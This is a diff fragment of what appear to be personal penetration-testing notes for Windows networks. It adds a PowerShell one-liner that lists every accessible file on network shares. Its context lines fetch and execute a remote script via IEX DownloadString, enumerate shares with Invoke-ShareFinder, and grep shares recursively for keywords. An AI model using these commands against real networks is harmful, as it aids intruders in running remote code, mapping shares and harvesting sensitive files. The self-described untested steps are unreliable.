@@ -10,6 +10,9 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 4. Run Sharefinder
 Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
 
+- To find all file names that are accessable:
+Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ | select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1] | select fullname | out-file -append files.txt}.
+
 5. Search for keyword (all not tested yet)
 This one is slow
 dir -Recurse | Select-String -pattern [SEARCH_PATTERN]
